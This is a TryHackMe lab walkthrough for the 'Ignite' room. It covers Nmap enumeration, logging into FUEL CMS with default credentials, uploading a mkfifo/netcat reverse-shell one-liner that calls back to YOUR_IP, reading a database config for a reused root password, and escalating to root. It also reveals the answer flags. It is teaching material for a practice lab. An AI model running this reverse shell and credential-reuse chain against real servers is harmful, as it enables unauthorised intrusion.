# Ignite — TryHackMe Walkthrough

> A new start-up has a few issues with their web server.

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/676cb3273c613c9ba00688162efc0979.png" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/ignite">
    <img src="https://img.shields.io/badge/TryHackMe-Ignite-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20Exploitation%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Security Misconfiguration |
| 4 | Exploitation — File Upload / RCE |
| 5 | Stored Passwords & Keys |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate open ports and identify web services using Nmap
- Identify a known CMS and look up its public exploits
- Exploit a default credential vulnerability to gain admin access
- Upload a reverse shell payload to gain remote code execution
- Extract stored database credentials from a configuration file
- Use found credentials to escalate to root

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap and Netcat installed

---

## Task 1 — Root It!

> Designed and created by [DarkStar7471](https://tryhackme.com/p/DarkStar7471), built by [Paradox](https://tryhackme.com/p/Paradox).

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify open ports and services. Use `-A` for OS and version detection, `-Pn` to skip host discovery, and `-sV` to enumerate service versions.

```
kali@kali:~/CTFs/tryhackme/Ignite$ sudo nmap -A -Pn -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 09:40 CEST
Nmap scan report for Machine_IP
Host is up (0.040s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.2 - 4.9 (92%), Linux 3.4 - 3.10 (92%), Linux 3.8 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   36.60 ms 10.8.0.1
2   36.85 ms Machine_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.39 seconds
```

> **Note:** Only port 80 is open, running **FUEL CMS** on Apache. Nmap also reveals a `robots.txt` entry disallowing `/fuel/` — this is the CMS admin panel path. FUEL CMS 1.4.1 has a known Remote Code Execution vulnerability documented at [Exploit-DB #47138](https://www.exploit-db.com/exploits/47138).

---

### Step 2 — Accessing the CMS Admin Panel

**Approach:** Navigate to `http://Machine_IP/fuel/login`. FUEL CMS ships with default credentials that are often left unchanged — try the most common default combination.

> **Note:** The default credentials for FUEL CMS are **`admin:admin`**. This is a classic security misconfiguration. Always change default credentials immediately after installation. The FUEL CMS security documentation at [docs.getfuelcms.com/general/security](https://docs.getfuelcms.com/general/security) specifically warns about this.

---

### Step 3 — Uploading a Reverse Shell

**Approach:** Once logged in as admin, navigate to `http://Machine_IP/fuel/pages/upload`. Set up a Netcat listener on your machine, then upload a reverse shell payload. The following mkfifo reverse shell is reliable for this environment:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 9001 >/tmp/f
```

> **Note:** This payload creates a named pipe (`mkfifo`), uses it to pipe shell input and output through Netcat, effectively creating an interactive reverse shell. Replace `YOUR_IP` with your TryHackMe VPN IP address (found with `ip a` on the `tun0` interface).

---

### Step 4 — Catching the Reverse Shell

**Approach:** Start a Netcat listener before triggering the upload. Once the shell connects, upgrade it to a proper interactive terminal using Python.

```
kali@kali:~/CTFs/tryhackme/Ignite$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] 35044
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
www-data
www-data@ubuntu:/home$ cd www-data
cd www-data
www-data@ubuntu:/home/www-data$ ls
ls
flag.txt
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

> **Note:** The shell connects as `www-data` — the web server user. Running `python -c 'import pty; pty.spawn("/bin/bash")'` upgrades the basic shell to a full interactive bash session, which allows commands like `su` to work properly. The user flag is found immediately in `/home/www-data/flag.txt`.

---

### Step 5 — Finding Stored Credentials in the Database Config

**Approach:** CMS applications store database credentials in configuration files. For FUEL CMS (which is built on CodeIgniter), the database config is located at `/var/www/html/fuel/application/config/database.php`. Read it to find the database password.

```
www-data@ubuntu:/home/www-data$ cat /var/www/html/fuel/application/config/database.php
```

```php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```

> **Note:** The database configuration file reveals that the application connects to MySQL as the **`root`** user with the password **`mememe`**. This is a serious misconfiguration — database connections should never run as root, and credentials should never be reused across services. Here, the root database password also happens to be the system root password.

---

### Step 6 — Escalating to Root

**Approach:** Try the database password found in the config file to switch to the root system user with `su - root`.

```
www-data@ubuntu:/home/www-data$ su - root
su - root
Password: mememe

root@ubuntu:~# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d
```

> **Note:** The root password was reused from the database configuration — a very common real-world mistake. Always use unique, strong passwords for each service and system account. With root access, the final flag is read directly from `/root/root.txt`.

---

### Question 1 — user.txt

<details>
<summary>Reveal Answer</summary>

**`6470e394cbf6dab6a91682cc8585059b`**

</details>

---

### Question 2 — root.txt

<details>
<summary>Reveal Answer</summary>

**`b9bbcb33e11b80be759c4e844862482d`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found port 80 running FUEL CMS 1.4.1 |
| 2 | Admin panel login | Gained access using default credentials `admin:admin` |
| 3 | Reverse shell upload | Uploaded mkfifo payload via the CMS file upload feature |
| 4 | Netcat listener | Caught shell as `www-data`, found `user.txt` in `/home/www-data/` |
| 5 | Config file inspection | Found root database password `mememe` in `database.php` |
| 6 | `su - root` | Reused database password to escalate to root, read `root.txt` |
